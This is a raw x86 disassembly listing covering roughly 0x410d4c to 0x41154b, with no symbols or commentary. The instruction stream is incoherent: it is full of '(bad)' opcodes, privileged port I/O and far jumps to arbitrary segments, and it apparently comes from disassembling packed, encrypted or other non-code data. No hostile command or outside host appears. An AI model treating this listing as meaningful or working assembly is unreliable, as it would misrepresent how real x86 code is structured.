  410d4c:	cwde   
  410d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d4e:	sub    eax,0x6e114350
  410d53:	add    esi,ebp
  410d55:	xor    edx,DWORD PTR [edx]
  410d57:	cmp    BYTE PTR [ecx-0x5e7a95e],al
  410d5d:	popf   
  410d5e:	sub    eax,0x5d9de448
  410d63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d64:	int    0xb3
  410d66:	xchg   esi,eax
  410d67:	stc    
  410d68:	cmp    ah,ch
  410d6a:	adc    dl,BYTE PTR [ebp-0xd76a3f6]
  410d70:	outs   dx,DWORD PTR ds:[esi]
  410d71:	repz bound esp,QWORD PTR [edx-0x2e]
  410d75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d76:	push   ebx
  410d77:	call   0x4a415e34
  410d7c:	sub    cl,dh
  410d7e:	and    eax,0xbf4c3f66
  410d83:	and    al,0x7e
  410d85:	jbe    0x410d38
  410d87:	call   0xb675232
  410d8c:	mov    DWORD PTR [edx],edx
  410d8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d8f:	push   ebp
  410d90:	pusha  
  410d91:	(bad)  [edi]
  410d93:	in     eax,dx
  410d94:	(bad)  
  410d95:	xchg   ebp,eax
  410d96:	ret    0x2c28
  410d99:	out    dx,eax
  410d9a:	add    esp,edx
  410d9c:	inc    esi
  410d9d:	mov    cl,0x25
  410d9f:	inc    eax
  410da0:	les    esi,FWORD PTR [ebx+0x6c]
  410da3:	neg    bl
  410da5:	pop    ss
  410da6:	sbb    ch,BYTE PTR [ecx+ecx*8+0x46]
  410daa:	sbb    DWORD PTR [edi+0xd3f7c5],esp
  410db0:	mov    bh,0x4b
  410db2:	int3   
  410db3:	mov    al,ds:0x2e6ff16b
  410db8:	push   ds
  410db9:	dec    esp
  410dba:	sbb    al,0xdc
  410dbc:	mov    ch,0x34
  410dbe:	int3   
  410dbf:	loop   0x410d9c
  410dc1:	popf   
  410dc2:	mov    bl,0x19
  410dc4:	dec    edi
  410dc5:	ror    DWORD PTR [ebp+esi*4+0x28],0xac
  410dca:	sub    bl,bl
  410dcc:	mov    ds:0xcad8ffd4,al
  410dd1:	add    bh,al
  410dd3:	mov    eax,ds:0x93029211
  410dd8:	jle    0x410d86
  410dda:	out    dx,al
  410ddb:	and    ch,BYTE PTR [eax]
  410ddd:	sub    BYTE PTR [eax+0x5d],bh
  410de0:	les    edx,FWORD PTR [ecx]
  410de2:	sbb    DWORD PTR [edx+edi*4+0xd1cc909],edx
  410de9:	sub    al,0xa4
  410deb:	xlat   BYTE PTR ds:[ebx]
  410dec:	sbb    cl,BYTE PTR [edx+0x3a]
  410def:	inc    ebp
  410df0:	popf   
  410df1:	inc    eax
  410df2:	or     BYTE PTR [eax+edx*1],0x9d
  410df6:	mov    al,0xac
  410df8:	bound  edx,QWORD PTR [edi]
  410dfa:	jae    0x410dae
  410dfc:	push   ecx
  410dfd:	mov    edi,0xbc556524
  410e02:	inc    esi
  410e03:	retf   
  410e04:	add    al,BYTE PTR [edi]
  410e06:	dec    DWORD PTR [esi-0x5]
  410e09:	fwait
  410e0a:	mov    al,ds:0x74af3e77
  410e0f:	and    eax,0x56703c49
  410e14:	add    edi,DWORD PTR [eax-0xe39f1d1]
  410e1a:	xchg   esp,eax
  410e1b:	pop    ecx
  410e1c:	mov    eax,0x3bcdda3a
  410e21:	scas   eax,DWORD PTR es:[edi]
  410e22:	xor    eax,0xae983c2d
  410e27:	cmp    ecx,DWORD PTR [eax+0x5d]
  410e2a:	stos   DWORD PTR es:[edi],eax
  410e2b:	jl     0x410ea5
  410e2d:	icebp  
  410e2e:	lea    esi,[ecx+0x27]
  410e31:	hlt    
  410e32:	sahf   
  410e33:	call   0x3e5f:0x219c5fcf
  410e3a:	adc    al,0x15
  410e3c:	dec    ebx
  410e3d:	loope  0x410e70
  410e3f:	and    DWORD PTR [ebx+0x74],edi
  410e42:	sbb    bh,BYTE PTR [esi-0x3f3d2b54]
  410e48:	imul   BYTE PTR [eax-0x23e9e0ae]
  410e4e:	mov    eax,DWORD PTR [ebx-0x8]
  410e51:	pop    ebx
  410e52:	fidiv  DWORD PTR cs:[ecx+0x60d43f5b]
  410e59:	jb     0x410e5d
  410e5b:	movhps xmm5,QWORD PTR [ecx+0x265c3a91]
  410e62:	xlat   BYTE PTR ds:[ebx]
  410e63:	imul   ecx,ebx,0x36
  410e66:	popf   
  410e67:	mov    ebp,0x35010be6
  410e6c:	add    BYTE PTR ds:0xbce0315b,ch
  410e72:	cmp    dl,BYTE PTR [esi+0x66]
  410e75:	je     0x410ef5
  410e77:	loopne 0x410e9b
  410e79:	cmp    ah,BYTE PTR [ebp-0x33]
  410e7c:	jne    0x410e87
  410e7e:	push   ebx
  410e7f:	imul   ebx,DWORD PTR [ebp-0x2daa0413],0x78898eb1
  410e89:	and    BYTE PTR [eax+edi*4-0x183c31dd],ch
  410e90:	mov    dl,0xc4
  410e92:	outs   dx,BYTE PTR ds:[esi]
  410e93:	in     eax,0x44
  410e95:	pop    esi
  410e96:	out    0x84,eax
  410e98:	popf   
  410e99:	(bad)  
  410e9a:	pusha  
  410e9b:	push   ss
  410e9c:	out    0x9b,eax
  410e9e:	jae    0x410e6a
  410ea0:	imul   cl
  410ea2:	frstor [edx+0x51dc27ba]
  410ea8:	pop    ds
  410ea9:	std    
  410eaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410eab:	mov    ah,0x59
  410ead:	imul   ecx,ecx,0x4200813f
  410eb3:	adc    eax,esi
  410eb5:	xchg   esp,eax
  410eb6:	dec    ecx
  410eb7:	cld    
  410eb8:	pop    ebx
  410eb9:	mov    ds:0x7a5db742,al
  410ebe:	add    al,0x3c
  410ec0:	(bad)  
  410ec1:	fstp   TBYTE PTR [edi+0x35]
  410ec4:	int3   
  410ec5:	pop    ecx
  410ec6:	add    al,BYTE PTR [eax]
  410ec8:	adc    BYTE PTR [eax-0x3c],dl
  410ecb:	imul   BYTE PTR [edx-0xd58dded]
  410ed1:	cmp    al,0xff
  410ed3:	mov    eax,0xf97724db
  410ed8:	dec    eax
  410ed9:	cli    
  410eda:	xor    BYTE PTR [edi-0x31],ah
  410edd:	jnp    0x410e76
  410edf:	jns    0x410f59
  410ee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ee2:	cwde   
  410ee3:	(bad)  
  410ee4:	jle    0x410f18
  410ee6:	add    bl,BYTE PTR [ecx]
  410ee8:	sub    esi,DWORD PTR [ebp-0x17]
  410eeb:	pushf  
  410eec:	idiv   BYTE PTR [esp+edx*4]
  410eef:	call   0x8796:0xbcea0e1a
  410ef6:	push   esi
  410ef7:	bound  eax,QWORD PTR [esi+ecx*8]
  410efa:	into   
  410efb:	rol    BYTE PTR [ebx-0x618eac25],cl
  410f01:	xchg   BYTE PTR [esi+0x38a9dfa2],bh
  410f07:	adc    DWORD PTR [edx],ecx
  410f09:	jo     0x410f10
  410f0b:	jbe    0x410f2f
  410f0d:	cmp    eax,0x22c348e4
  410f12:	loopne 0x410ef0
  410f14:	add    al,0x1b
  410f16:	and    eax,DWORD PTR [ecx]
  410f18:	inc    esp
  410f19:	ror    BYTE PTR [esi-0x35],0xcb
  410f1d:	xor    al,0x4a
  410f1f:	xchg   edx,eax
  410f20:	adc    dh,BYTE PTR [edx]
  410f22:	adc    ch,ah
  410f24:	cli    
  410f25:	loope  0x410f9d
  410f27:	mov    eax,ds:0x2b1a7938
  410f2c:	loop   0x410eee
  410f2e:	sbb    bl,BYTE PTR [eax-0x74]
  410f31:	mov    ebp,0xdfb501fc
  410f36:	or     BYTE PTR [edi],ah
  410f38:	clc    
  410f39:	jnp    0x410f35
  410f3b:	cmp    edi,DWORD PTR [edi+0x65]
  410f3e:	fnstcw WORD PTR [ebx]
  410f40:	in     eax,0x89
  410f42:	mov    cs,WORD PTR [esi+ecx*2+0x61fa0f99]
  410f49:	add    BYTE PTR [ecx-0x1bc98abb],ah
  410f4f:	stos   BYTE PTR es:[edi],al
  410f50:	add    DWORD PTR [ecx+0x420db246],esp
  410f56:	imul   ebx,DWORD PTR [ebp-0xf23aa0d],0x50c56cba
  410f60:	cmp    BYTE PTR [edi+0x7716f0a7],cl
  410f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f67:	jmp    0x9a4da0e4
  410f6c:	push   ecx
  410f6d:	pop    ds
  410f6e:	jl     0x410fa0
  410f70:	jbe    0x410efe
  410f72:	rcl    DWORD PTR [edi-0x51],1
  410f75:	test   BYTE PTR [edx],0x48
  410f78:	cmp    DWORD PTR [eax+0x77ee9276],esi
  410f7e:	or     bh,BYTE PTR [edx+0x78]
  410f81:	cmc    
  410f82:	dec    ecx
  410f83:	out    dx,eax
  410f84:	and    dh,BYTE PTR [ecx]
  410f86:	jp     0x410f8d
  410f88:	rcl    BYTE PTR [esi-0x3d],1
  410f8b:	popa   
  410f8c:	leave  
  410f8d:	scas   al,BYTE PTR es:[edi]
  410f8e:	inc    eax
  410f8f:	dec    edx
  410f90:	adc    al,0x57
  410f92:	fdivr  DWORD PTR [eax+0xb]
  410f95:	mov    ah,0x62
  410f97:	ror    ebp,cl
  410f99:	jns    0x410f4f
  410f9b:	push   edx
  410f9c:	adc    al,0x59
  410f9e:	imul   esi,edi,0x7e02aa84
  410fa4:	je     0x410fa2
  410fa6:	(bad)  
  410fa7:	push   cs
  410fa8:	cmp    eax,0x62a111c4
  410fad:	or     eax,0x570bd567
  410fb2:	mov    esi,0x649b63
  410fb7:	pop    esp
  410fb8:	xlat   BYTE PTR es:[ebx]
  410fba:	mov    esp,0xb6c5cd08
  410fbf:	lds    esi,FWORD PTR [ebp-0x52c673c3]
  410fc5:	aaa    
  410fc6:	cli    
  410fc7:	icebp  
  410fc8:	jno    0x410f5b
  410fca:	enter  0x30f1,0x22
  410fce:	pushf  
  410fcf:	inc    esi
  410fd0:	and    DWORD PTR [edx],0x7f
  410fd3:	call   0xe384:0xfed5369
  410fda:	cmp    ecx,DWORD PTR [eax-0x1eb61f89]
  410fe0:	xchg   esp,eax
  410fe1:	mov    bh,0xb4
  410fe3:	lea    ebp,[ebx]
  410fe5:	mov    edi,0xd7c60210
  410fea:	cmp    eax,0xc63d4b4a
  410fef:	dec    BYTE PTR [ebx-0x3bd044c2]
  410ff5:	push   eax
  410ff6:	xchg   esi,eax
  410ff7:	lea    eax,[edx+edx*8+0x3ae22530]
  410ffe:	mov    ?,WORD PTR [ebp-0x36]
  411001:	or     BYTE PTR [edi-0x3b],0xd
  411005:	dec    edi
  411006:	pop    ss
  411007:	push   esi
  411008:	and    DWORD PTR es:[bp+0x6694],ebp
  41100e:	out    0x21,al
  411010:	scas   eax,DWORD PTR es:[edi]
  411011:	test   eax,0x2d7a1c27
  411016:	sub    dl,dh
  411018:	pop    ss
  411019:	test   BYTE PTR [ecx-0x16],bl
  41101c:	aad    0x10
  41101e:	out    0x13,al
  411020:	popa   
  411021:	sub    BYTE PTR [esi-0x18],0x82
  411025:	test   al,0xfb
  411027:	push   ebx
  411028:	les    ebx,FWORD PTR [edi]
  41102a:	xchg   BYTE PTR [edx+0x265acf90],ch
  411030:	mov    ebx,edi
  411032:	jno    0x411002
  411034:	into   
  411035:	fs jns 0x411019
  411038:	push   ds
  411039:	out    0x6a,al
  41103b:	mov    al,ds:0x5a5a87bc
  411040:	mov    ecx,0x3ed47da6
  411045:	adc    cl,bh
  411047:	in     eax,0xe8
  411049:	inc    edx
  41104a:	xor    al,0xe7
  41104c:	es push ebx
  41104e:	sbb    BYTE PTR [ecx],0x6f
  411051:	xchg   edx,eax
  411052:	call   0xea6f4d39
  411057:	(bad)  
  411058:	sub    al,0xce
  41105a:	dec    eax
  41105b:	adc    esp,DWORD PTR [esp+esi*2]
  41105e:	mov    ebx,0x8d5625e4
  411063:	in     eax,dx
  411064:	sub    DWORD PTR [edx-0x6b],ecx
  411067:	pop    esi
  411068:	std    
  411069:	and    DWORD PTR [ecx-0x39],edx
  41106c:	or     dh,BYTE PTR [edi]
  41106e:	mov    bh,0xbf
  411070:	jo     0x4110c0
  411072:	or     al,ch
  411074:	push   cs
  411075:	fcmovne st,st(7)
  411077:	dec    esi
  411078:	call   0xab0e6f5f
  41107d:	aas    
  41107e:	sti    
  41107f:	scas   eax,DWORD PTR es:[edi]
  411080:	icebp  
  411081:	mov    ?,WORD PTR [ecx+0x1dafcf0f]
  411087:	and    eax,0x2d36f0d7
  41108c:	sub    ecx,0xb8cad158
  411092:	add    eax,0x8ef7e57
  411097:	inc    ebx
  411098:	test   DWORD PTR [edx],ebp
  41109a:	inc    ebp
  41109b:	jae    0x4110a5
  41109d:	ret    0x4a33
  4110a0:	pop    ecx
  4110a1:	inc    edi
  4110a2:	inc    edi
  4110a3:	mov    ecx,0x285ce612
  4110a8:	hlt    
  4110a9:	ror    BYTE PTR [ebx],1
  4110ab:	test   DWORD PTR [eax+0x579be52a],ebx
  4110b1:	call   0xcde8:0x72cbe2e6
  4110b8:	retf   0xf4a7
  4110bb:	bt     DWORD PTR [esi-0x4b],esp
  4110bf:	outs   dx,DWORD PTR ds:[esi]
  4110c0:	clc    
  4110c1:	sar    DWORD PTR [esp+ebp*4-0x5a],1
  4110c5:	mov    bl,BYTE PTR [ebp+0x61168efb]
  4110cb:	retf   0xed59
  4110ce:	fst    st(6)
  4110d0:	ins    BYTE PTR es:[edi],dx
  4110d1:	adc    BYTE PTR [eax-0x1c],dh
  4110d4:	xor    bh,cl
  4110d6:	mov    bh,cl
  4110d8:	push   cs
  4110d9:	push   esp
  4110da:	xor    eax,0xda6c860
  4110df:	mov    dl,0xdf
  4110e1:	or     BYTE PTR [eax+0x3d43456],0x72
  4110e8:	call   0x581d:0x661117cb
  4110ef:	cs fucompp 
  4110f2:	imul   ebp,ebx,0xaf784185
  4110f8:	mov    ds:0x6e675eb5,eax
  4110fd:	and    al,0x8d
  4110ff:	sbb    cl,ah
  411101:	lea    ebx,[ecx+0x7a]
  411104:	retf   
  411105:	ss pop ds
  411107:	je     0x41115d
  411109:	shr    DWORD PTR ds:0xf4ffd97c,0x51
  411110:	xor    DWORD PTR [ebx-0x2a],ecx
  411113:	inc    esi
  411114:	lds    esp,FWORD PTR [eax-0x11bd9072]
  41111a:	pop    esi
  41111b:	ret    0xd22
  41111e:	xor    bh,al
  411120:	xor    BYTE PTR [ebx-0x5043e7db],ch
  411126:	ret    
  411127:	inc    ebx
  411128:	(bad)  
  411129:	in     eax,0x6c
  41112b:	(bad)  
  41112c:	sub    al,0x70
  41112e:	cmp    al,0xbd
  411130:	dec    esp
  411131:	cld    
  411132:	dec    edx
  411133:	sahf   
  411134:	xchg   edi,ecx
  411136:	cmp    BYTE PTR [edx],al
  411138:	cmc    
  411139:	or     DWORD PTR [edx],edx
  41113b:	mov    edx,0x19b3f64
  411140:	pop    edx
  411141:	adc    al,0x17
  411143:	jns    0x411102
  411145:	jns    0x4111bb
  411147:	inc    edx
  411148:	jle    0x411123
  41114a:	add    bl,0x12
  41114d:	stos   BYTE PTR es:[edi],al
  41114e:	pop    esp
  41114f:	outs   dx,DWORD PTR ds:[esi]
  411150:	enter  0xd84f,0x6d
  411154:	xor    eax,0xf2e98fd9
  411159:	xor    al,0x11
  41115b:	(bad)  
  41115c:	cmp    eax,0xbdc08502
  411161:	cmp    al,0x1c
  411163:	add    BYTE PTR [eax],bh
  411165:	jecxz  0x4111ce
  411167:	fisub  DWORD PTR [eax]
  411169:	cmp    ch,0xa0
  41116c:	fbld   TBYTE PTR [ecx-0x6556413d]
  411172:	xchg   edi,eax
  411173:	shr    DWORD PTR [ebx],1
  411175:	dec    edx
  411176:	sub    al,0x72
  411178:	mov    eax,0x78e55a08
  41117d:	inc    ecx
  41117e:	push   0x3c19540c
  411183:	shl    eax,cl
  411185:	fbstp  TBYTE PTR [eax]
  411187:	cs mov esi,0x22385dc5
  41118d:	or     eax,0x9c9bd732
  411192:	mov    ds:0x220e2d68,eax
  411197:	mov    al,0x96
  411199:	inc    edi
  41119a:	bound  ebp,QWORD PTR [edi-0x9]
  41119d:	mov    ecx,0x225a0014
  4111a2:	pop    ecx
  4111a3:	or     bh,bh
  4111a5:	shr    BYTE PTR [ebx],0xa2
  4111a8:	aam    0xc1
  4111aa:	enter  0x232a,0x96
  4111ae:	jno    0x41113d
  4111b0:	scas   al,BYTE PTR es:[edi]
  4111b1:	mov    dl,BYTE PTR [edx+0x7f13f3fa]
  4111b7:	lods   eax,DWORD PTR ds:[esi]
  4111b8:	outs   dx,DWORD PTR ds:[esi]
  4111b9:	mov    eax,es:0x6e20dff7
  4111bf:	popf   
  4111c0:	enter  0x300e,0x10
  4111c4:	in     al,0x80
  4111c6:	test   DWORD PTR [ecx],esp
  4111c8:	test   al,0x9
  4111ca:	(bad)  
  4111cb:	scas   eax,DWORD PTR es:[edi]
  4111cc:	sbb    al,0x87
  4111ce:	or     edi,DWORD PTR [ebx]
  4111d0:	push   edi
  4111d1:	mov    al,0x9a
  4111d3:	xchg   esi,eax
  4111d4:	punpcklwd mm1,mm5
  4111d7:	dec    esp
  4111d8:	sbb    DWORD PTR [ebx],esi
  4111da:	add    al,0x3f
  4111dc:	ins    BYTE PTR es:[edi],dx
  4111dd:	(bad)  
  4111de:	(bad)  
  4111df:	lods   al,BYTE PTR ds:[esi]
  4111e0:	das    
  4111e1:	mov    al,ds:0x30e8324f
  4111e6:	dec    edx
  4111e7:	cmp    eax,0x52511b65
  4111ec:	inc    edi
  4111ed:	push   edi
  4111ee:	adc    edx,DWORD PTR [ecx]
  4111f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111f1:	repz ds push ebp
  4111f4:	jmp    0x41121a
  4111f6:	jl     0x411277
  4111f8:	test   DWORD PTR [eax-0x33b2b7b5],esi
  4111fe:	rcr    BYTE PTR [edx-0x52],1
  411201:	arpl   WORD PTR [ecx-0x7e661ee1],si
  411207:	and    al,0xbc
  411209:	add    ebp,DWORD PTR [edx]
  41120b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41120c:	push   eax
  41120d:	pop    ebx
  41120e:	jne    0x411229
  411210:	fsin   
  411212:	xchg   ebp,eax
  411213:	cmp    DWORD PTR [esi-0x554b5b14],ebx
  411219:	ins    BYTE PTR es:[edi],dx
  41121a:	repz mov esi,DWORD PTR [eax+ecx*2-0x6808b991]
  411222:	gs and eax,0xf968c2ec
  411228:	jns    0x4111ff
  41122a:	jl     0x411228
  41122c:	mov    ah,0x29
  41122e:	sub    al,0x7a
  411230:	(bad)  
  411231:	(bad)  
  411232:	in     al,0x1a
  411234:	shl    BYTE PTR [edx+0x1b],0x86
  411238:	es push 0x30
  41123b:	adc    BYTE PTR [ebp-0x4be311d0],dh
  411241:	shr    DWORD PTR [ebx-0x2d],1
  411244:	sub    al,0x67
  411246:	cs jg  0x411237
  411249:	sbb    cl,al
  41124b:	xchg   edi,eax
  41124c:	add    dh,bh
  41124e:	sahf   
  41124f:	dec    ebx
  411250:	dec    eax
  411251:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411252:	pop    ecx
  411253:	sbb    ebp,DWORD PTR [eax+0x582cd467]
  411259:	push   0x1a
  41125b:	jo     0x411299
  41125d:	data16 jne 0x4112d0
  411260:	mov    ebx,0x9f08c9ef
  411265:	ret    
  411266:	sti    
  411267:	push   ds
  411268:	sbb    DWORD PTR [edx+0x31a79629],edx
  41126e:	adc    eax,0x8b69ddd7
  411273:	jae    0x411266
  411275:	mov    edx,0x209e9275
  41127a:	test   eax,0xce38c679
  41127f:	aaa    
  411280:	pop    ebx
  411281:	push   ds
  411282:	dec    esi
  411283:	ins    DWORD PTR es:[edi],dx
  411284:	enter  0x8ce,0x54
  411288:	mov    cl,0xe2
  41128a:	add    ebx,esi
  41128c:	jle    0x411231
  41128e:	jecxz  0x411307
  411290:	mov    ds:0x1b0d511d,eax
  411295:	cwde   
  411296:	inc    esi
  411297:	pop    esi
  411298:	mov    BYTE PTR [edi],dl
  41129a:	mov    ebx,DWORD PTR [edx+0x62402f99]
  4112a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a1:	aam    0xd3
  4112a3:	add    DWORD PTR [eax-0x4c],edi
  4112a6:	sbb    DWORD PTR [edx+0x5c],esi
  4112a9:	jb     0x411306
  4112ab:	jle    0x41128f
  4112ad:	iret   
  4112ae:	mov    WORD PTR [ecx+0x30],?
  4112b1:	dec    ebp
  4112b2:	mov    bl,0x9a
  4112b4:	adc    al,0x36
  4112b6:	add    al,0x9c
  4112b8:	xchg   ebp,eax
  4112b9:	mov    eax,0xf4fd8e59
  4112be:	sbb    eax,0x5f340672
  4112c3:	push   edi
  4112c4:	sub    dl,bh
  4112c6:	pop    esp
  4112c7:	fwait
  4112c8:	xor    cl,BYTE PTR [eax-0x360e3af6]
  4112ce:	daa    
  4112cf:	or     eax,DWORD PTR [esi+ebx*1+0x5857338a]
  4112d6:	jmp    0xe778:0xa41d31e
  4112dd:	lods   eax,DWORD PTR ds:[esi]
  4112de:	push   0xffffffa2
  4112e0:	out    dx,eax
  4112e1:	add    eax,0x45f377ca
  4112e6:	mov    bh,0xf5
  4112e8:	inc    ecx
  4112e9:	sbb    esp,DWORD PTR ss:[ecx-0x656b42aa]
  4112f0:	mov    edx,0xe5bb19b
  4112f5:	inc    ebx
  4112f6:	jl     0x411359
  4112f8:	mov    al,BYTE PTR [ebp-0x185f3279]
  4112fe:	jmp    0xf35ac358
  411303:	xor    BYTE PTR [eax],bl
  411305:	adc    eax,0xc5602e4b
  41130a:	ret    
  41130b:	out    0x7d,eax
  41130d:	outs   dx,DWORD PTR ds:[esi]
  41130e:	inc    esp
  41130f:	js     0x4112eb
  411311:	pop    ds
  411312:	or     esi,DWORD PTR [ecx-0x2c564eab]
  411318:	xor    esi,ebp
  41131a:	push   esp
  41131b:	xor    ebp,ebp
  41131d:	mov    bh,0x21
  41131f:	pop    ss
  411320:	(bad)  
  411321:	jnp    0x411331
  411323:	xchg   ebp,eax
  411324:	xor    eax,0x9b53e847
  411329:	pop    esp
  41132a:	(bad)  
  41132b:	cli    
  41132c:	xchg   ebp,eax
  41132d:	test   eax,0x1d8dfbc1
  411332:	mov    al,0xa5
  411334:	stos   BYTE PTR es:[edi],al
  411335:	inc    esi
  411336:	jae    0x41133d
  411338:	mov    ss,edx
  41133a:	and    edi,DWORD PTR [edx-0x7c]
  41133d:	inc    edx
  41133e:	push   cs
  41133f:	sub    edx,DWORD PTR [edi-0x1b5f1fa5]
  411345:	lahf   
  411346:	test   DWORD PTR [ebx-0x15206353],0x5b0f2745
  411350:	push   edx
  411351:	dec    edx
  411352:	sbb    esp,ebp
  411354:	or     cl,BYTE PTR [eax+esi*2+0x0]
  411358:	hlt    
  411359:	cmp    DWORD PTR [edx-0x5521eed1],0x2e
  411360:	lock js 0x411374
  411363:	xchg   BYTE PTR [ebx],al
  411365:	mov    edx,0x788102dd
  41136a:	clc    
  41136b:	(bad)  
  41136c:	mov    ebp,0x702a6857
  411371:	pop    ds
  411372:	and    BYTE PTR [edi-0x26],dh
  411375:	mov    WORD PTR [ebp-0x683ae40d],fs
  41137b:	nop
  41137c:	jg     0x4113e3
  41137e:	dec    eax
  41137f:	xor    eax,0x253df8bb
  411384:	rol    DWORD PTR [edi-0x64],0xaf
  411388:	dec    ecx
  411389:	iret   
  41138a:	out    dx,eax
  41138b:	icebp  
  41138c:	push   ds
  41138d:	je     0x41131a
  41138f:	inc    ebp
  411390:	jmp    0x88ea9efa
  411395:	mov    dh,0xa6
  411397:	pop    ebx
  411398:	ja     0x4113b9
  41139a:	(bad)  
  41139c:	popa   
  41139d:	mov    dh,dl
  41139f:	cmp    DWORD PTR [ebp-0x71a18933],esp
  4113a5:	sbb    al,0xd4
  4113a7:	mov    dh,BYTE PTR [ebx]
  4113a9:	sub    bh,ah
  4113ab:	test   eax,0xcdd6b520
  4113b0:	xlat   BYTE PTR ds:[ebx]
  4113b1:	dec    edx
  4113b2:	xor    esp,edx
  4113b4:	and    BYTE PTR [edi+0x2b8f0c48],ah
  4113ba:	mov    WORD PTR [ebx-0x2cfef0fa],fs
  4113c0:	lock xor ebp,DWORD PTR [edi]
  4113c3:	aaa    
  4113c4:	rcl    edx,0x32
  4113c7:	mov    BYTE PTR [eax],ah
  4113c9:	(bad)  
  4113ca:	std    
  4113cb:	mov    ecx,DWORD PTR ds:0x9ad1737b
  4113d1:	test   al,0x50
  4113d3:	mov    DWORD PTR [esi+eiz*4-0x6c762d4f],edx
  4113da:	mov    ah,0x98
  4113dc:	mov    esp,0x80b37723
  4113e1:	js     0x411458
  4113e3:	popf   
  4113e4:	add    DWORD PTR [ebp-0x42],eax
  4113e7:	das    
  4113e8:	scas   eax,DWORD PTR es:[edi]
  4113e9:	rcl    ebp,1
  4113eb:	js     0x411384
  4113ed:	sub    eax,0x9e6469c5
  4113f2:	dec    ebx
  4113f3:	int3   
  4113f4:	or     edx,esp
  4113f6:	jg     0x41145b
  4113f8:	inc    ecx
  4113f9:	icebp  
  4113fa:	pop    esi
  4113fb:	xor    DWORD PTR [ebx],edx
  4113fd:	push   edx
  4113fe:	das    
  4113ff:	jns    0x41142c
  411401:	jae    0x411415
  411403:	out    dx,al
  411404:	sbb    eax,0xdf3f0445
  411409:	hlt    
  41140a:	dec    ebx
  41140b:	scas   al,BYTE PTR es:[edi]
  41140c:	popa   
  41140d:	es in  al,dx
  41140f:	mov    ah,0xd8
  411411:	scas   eax,DWORD PTR es:[edi]
  411412:	fisub  DWORD PTR [esi+0x40]
  411415:	mov    ebx,ebx
  411417:	or     BYTE PTR [edi],bl
  411419:	sbb    esi,eax
  41141b:	cmp    eax,0x2556d723
  411420:	into   
  411421:	pop    ds
  411422:	xchg   edx,eax
  411423:	xor    eax,0x5ea4ff9c
  411428:	jbe    0x4113f9
  41142a:	scas   eax,DWORD PTR es:[edi]
  41142b:	pop    edx
  41142c:	xor    ah,bl
  41142e:	stos   DWORD PTR es:[edi],eax
  41142f:	repnz test cl,al
  411432:	gs xor eax,0x9103f8f6
  411438:	in     eax,0x37
  41143a:	inc    eax
  41143b:	aas    
  41143c:	icebp  
  41143d:	shl    dh,0xd8
  411440:	or     esi,DWORD PTR [ebx+0x6c]
  411443:	or     eax,0x4fafe829
  411448:	push   ecx
  411449:	inc    edi
  41144a:	mov    ds:0xc4e8e5c1,eax
  41144f:	pop    ss
  411450:	cld    
  411451:	imul   eax,DWORD PTR [edi],0x8deef9d
  411457:	jmp    0x7be3:0xbb616ee0
  41145e:	pop    es
  41145f:	push   esi
  411460:	xchg   BYTE PTR [esi+0x74],ah
  411463:	fild   DWORD PTR [ebx-0x80]
  411466:	or     eax,0xa2cc188a
  41146b:	(bad)  
  41146c:	jl     0x4114db
  41146e:	sub    BYTE PTR [edx+0x53d69649],bl
  411474:	lock jge 0x411449
  411477:	dec    eax
  411478:	test   DWORD PTR [ebp-0x5a],0x1ac85e6
  41147f:	jno    0x4114e8
  411481:	clc    
  411482:	mov    al,ds:0x815f13f5
  411487:	pop    esi
  411488:	test   eax,0x63fcbd64
  41148d:	adc    DWORD PTR [ebp-0x68fe1d82],0x38
  411494:	dec    edx
  411495:	add    al,0xc0
  411497:	jle    0x41148f
  411499:	jp     0x4114b2
  41149b:	fistp  DWORD PTR [eax-0x36f98412]
  4114a1:	into   
  4114a2:	shr    DWORD PTR [esi-0x5baf45a],0x75
  4114a9:	stc    
  4114aa:	fs push es
  4114ac:	int    0x5d
  4114ae:	in     al,dx
  4114af:	retf   0x7047
  4114b2:	mov    dh,0xec
  4114b4:	mov    edi,0x39054273
  4114b9:	fstp   DWORD PTR [ebp-0x64]
  4114bc:	xor    eax,0xaa105cb7
  4114c1:	mov    dl,BYTE PTR [eax+edx*1-0x465a3720]
  4114c8:	xchg   ecx,eax
  4114c9:	call   0x26be:0x3a42d236
  4114d0:	jmp    0x2789:0x1a3d6e1b
  4114d7:	xchg   esp,eax
  4114d8:	aaa    
  4114d9:	sbb    DWORD PTR [eax+esi*2-0x7],esp
  4114dd:	rcr    BYTE PTR [eax],1
  4114df:	rol    bl,0xe8
  4114e2:	test   eax,0x30ce3c8b
  4114e7:	mov    edx,0x17968fb2
  4114ec:	dec    edi
  4114ed:	ds sti 
  4114ef:	jb     0x4114dd
  4114f1:	sbb    bh,BYTE PTR [ebp-0x72af09a]
  4114f7:	loop   0x411481
  4114f9:	(bad)  
  4114fa:	shl    ebx,0xbe
  4114fd:	adc    edi,DWORD PTR [edx-0x1d]
  411500:	jmp    0xf26c1e03
  411505:	leave  
  411506:	fs dec edx
  411508:	push   es
  411509:	pop    ds
  41150a:	xchg   BYTE PTR [edi+ebp*4+0x3eeda009],bl
  411511:	sub    ebx,ecx
  411513:	push   es
  411514:	or     al,0xf
  411516:	rcl    DWORD PTR [edi+0x399185f],1
  41151c:	or     al,0x6b
  41151e:	xor    ebx,DWORD PTR [esp+ebx*2-0x5b8d53a1]
  411525:	in     eax,dx
  411526:	dec    ecx
  411527:	xchg   DWORD PTR [eax+edi*4-0x70beb109],ecx
  41152e:	sbb    bh,BYTE PTR [eax-0x226fb806]
  411534:	popf   
  411535:	and    BYTE PTR [ebp+0xb],0x44
  411539:	push   esp
  41153a:	shl    DWORD PTR [esi],0xc8
  41153d:	leave  
  41153e:	push   0xffffffe5
  411540:	lods   eax,DWORD PTR ds:[esi]
  411541:	clc    
  411542:	inc    ecx
  411543:	outs   dx,DWORD PTR ds:[esi]
  411544:	mov    esp,0x8a4198dd
  411549:	xchg   esp,eax
  41154a:	outs   dx,DWORD PTR ds:[esi]
  41154b:	scas   al,BYTE PTR es:[edi]
